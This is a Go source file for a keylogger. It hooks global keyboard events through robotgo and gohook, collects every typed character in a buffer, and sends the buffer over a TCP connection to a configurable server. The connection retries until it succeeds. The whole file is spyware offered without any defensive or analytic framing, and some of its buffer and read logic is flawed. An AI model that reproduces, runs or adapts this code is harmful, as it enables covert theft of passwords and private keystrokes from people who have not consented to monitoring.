package main

import (
	"net"
	"time"

	"github.com/go-vgo/robotgo"
	gohook "github.com/robotn/gohook"
)

// configuration
const (
	HOST, PORT = "127.0.0.1", "2941"
	BUFFER     = 4096
	TYPE       = "tcp"
)

var (
	cbuf = ""
)

// establishes a connection to the server.
func establish() net.Conn {
start:
	addr, err := net.ResolveTCPAddr(TYPE, HOST+":"+PORT)
	if err != nil {
		time.Sleep(time.Second * 5)
		goto start
	}
	conn, err := net.DialTCP(TYPE, nil, addr)
	if err != nil {
		time.Sleep(time.Second * 5)
		goto start
	}
	return conn
}

// sends keys to the server
func dispatch() {
	conn := establish()
	for {
		if len(cbuf) > 0 {
			_, err := conn.Write([]byte(cbuf))
			if err != nil {
				dispatch()
				return
			}
			var data []byte
			rl, err := conn.Read(data)
			if err != nil {
				dispatch()
				return
			}
			cbuf = cbuf[BUFFER-(BUFFER-rl-1):]
		}
	}
}

func main() {
	// update and send cbuf to server when needed
	go dispatch()

	// start listening to keys
	eh := robotgo.EventStart()
	for e := range eh {
		if e.Kind == gohook.KeyDown {
			if e.Keycode == 49 {
				cbuf += " "
			} else {
				cbuf += string(e.Keychar)
			}
		}
	}
}
